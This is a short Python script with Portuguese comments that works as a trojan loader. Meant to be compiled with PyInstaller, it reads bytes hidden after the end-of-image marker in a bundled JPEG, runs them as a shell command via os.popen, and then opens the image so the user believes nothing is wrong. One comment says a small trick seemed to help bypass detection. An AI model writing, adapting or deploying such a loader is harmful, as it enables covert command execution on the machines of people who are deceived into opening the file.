import os
import sys
import tempfile
import shutil

# Viabilizar a inclusao da imagem no binário compilado
def resource_path(relative_path):

    try:
        # Esse é o que executa no binário compilado
        base_path = sys._MEIPASS
    except Exception:
        # Esse so executa como script
        base_path = os.path.abspath(".")

    return os.path.join(base_path, relative_path)

# Abrir a imagem com a aplicacao padrao de imagens, para o usuario achar que está tudo normal
def abrir_imagem(imagem_path):
    
    os.popen(imagem_path)


minha_imagem = "jojo.jpeg"

# Copiar a imagem para outro diretorio, viabilizando sua abertura por abrir_imagem
imagem_temp_dir = tempfile.gettempdir()
imagem_temp_path = os.path.join(imagem_temp_dir, minha_imagem)
shutil.copy(resource_path(minha_imagem), imagem_temp_path)

# Abrir a imagem para leitura do que nos interessa
with open(imagem_temp_path, 'rb') as f:
    content = f.read()
    offset = content.index(bytes.fromhex('FFD9'))

    f.seek(offset + 2)
    baites = f.read()
    notBaites = baites.decode("utf-8")

# Pequeno arrodeio que parece ter ajudado no 'baipess'
batima = notBaites
notBaites = ""
output = os.popen(batima)

abrir_imagem(imagem_temp_path)




